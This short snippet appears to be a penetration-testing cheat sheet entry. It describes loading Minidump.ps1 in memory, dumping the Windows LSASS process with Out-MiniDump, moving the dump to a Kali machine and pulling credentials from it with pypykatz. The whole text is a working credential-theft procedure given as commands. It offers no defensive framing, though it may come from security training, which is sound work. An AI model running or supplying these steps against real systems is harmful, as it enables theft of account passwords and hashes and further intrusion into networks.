> We download Minidump.ps1 in memory and execute:

```
Get-Process lsass | Out-MiniDump -DumpFilePath <output_path>
```

> Once the file is created, download it to kali and then extract creds using pypykatz:

```
pypykatz lsa minidump <file>.dmp >> hash.txt
```
